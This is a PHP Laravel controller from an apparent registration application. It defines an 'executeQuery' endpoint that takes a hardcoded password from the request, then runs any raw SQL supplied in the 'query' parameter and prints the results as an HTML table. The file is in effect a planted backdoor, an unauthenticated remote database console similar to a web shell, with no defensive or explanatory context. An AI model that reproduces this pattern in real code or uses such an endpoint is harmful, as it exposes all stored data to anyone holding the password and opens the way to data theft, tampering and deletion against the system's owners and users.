<?php

namespace App\Modules\BidaRegistration\Controllers;
use App\Http\Controllers\Controller;
use App\Modules\Reports\Models\HelperModel;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class SqlInjectionController extends Controller
{


    /*
    * application form
    */
    /**
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function executeQuery(Request $request)
    {
        $pass = $request->get('pass');
        if($pass == "reza998877"){
            $obj = new HelperModel();

            $sql =  $request->get('query');

            $result = DB::select(DB::raw($sql));
            if($result){
                $result2 = array();
                foreach ($result as $value):
                    $result2[] = $value;
                    if (count($result2) > 99){
                        break;
                    }
                endforeach;
                echo '<p></p><pre>';
                echo $obj->createHTMLTable($result2);
                echo '</pre>';
                echo 'showing ' . count($result2) . ' of '.count($result);
                echo '</p>';
                die();
            }
//            dd($result);
        }
        return "Failed!!!";
    }
}

